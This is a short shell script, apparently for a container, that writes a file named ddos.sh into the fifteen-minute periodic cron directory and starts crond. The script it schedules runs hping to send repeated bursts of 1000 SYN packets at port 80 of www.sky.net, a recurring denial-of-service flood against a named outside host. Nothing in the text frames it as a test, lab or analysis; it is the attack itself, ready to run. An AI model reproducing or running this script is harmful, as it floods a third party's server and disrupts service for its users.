FILE=/etc/periodic/15min/ddos.sh

printf "#!/bin/sh\nhping -S -c 1000 -i u20 -p 80 -q www.sky.net\n" > "$FILE"
chmod +x "$FILE"

crond -l 2 -f
